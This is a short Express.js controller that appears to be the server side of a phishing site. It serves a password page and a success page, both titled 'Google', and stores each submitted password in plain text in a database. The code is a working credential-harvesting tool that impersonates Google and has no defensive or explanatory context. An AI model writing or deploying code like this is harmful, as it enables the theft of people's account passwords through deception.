const dataModel = require("../models/dataModel");

const passCtrl = {};

passCtrl.getPass = async (req, res) => {
    res.render('password', {
        doc_title: 'Google'
    })
}

passCtrl.passField = async (req, res) => {
    const {password} = req.body;
    const newPass = new dataModel({
        pass: password
    });

    await newPass.save();

    res.redirect('/success');
}

passCtrl.getSuccess = async (req, res) => {
    res.render('success', {
        doc_title: 'Google'
    })
}
module.exports = passCtrl;